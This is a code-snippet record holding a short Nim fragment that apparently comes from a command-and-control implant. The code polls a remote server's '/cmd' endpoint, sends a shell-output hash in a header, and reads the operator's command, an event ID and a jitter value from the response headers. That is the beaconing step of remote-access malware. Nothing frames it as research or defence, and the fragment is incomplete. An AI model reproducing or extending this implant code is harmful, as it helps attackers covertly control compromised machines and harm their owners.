---
id: 1e5fc218-7ef5-4765-9431-3ad16584eff8
type: code
language: ''
verified: false
created_at: '2023-06-06T03:12:44.556609+00:00'
updated_at: '2023-06-06T03:13:11.600469+00:00'
---

# Code Snippet 1e5fc218

```
var GetCommand = newHttpClient(userAgent= defUserAgent)
GetCommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = GetCommand.request(server & "/cmd", httpMethod = HttpGet)
#echo sent.status
let response = sent.headers
let cmd = response.getOrDefault("X-cmd") # Check for Command
let event_id = response.getOrDefault("x-event-id") # Check for event ID
let jitter = response.getOrDefault("x-jitter")
```
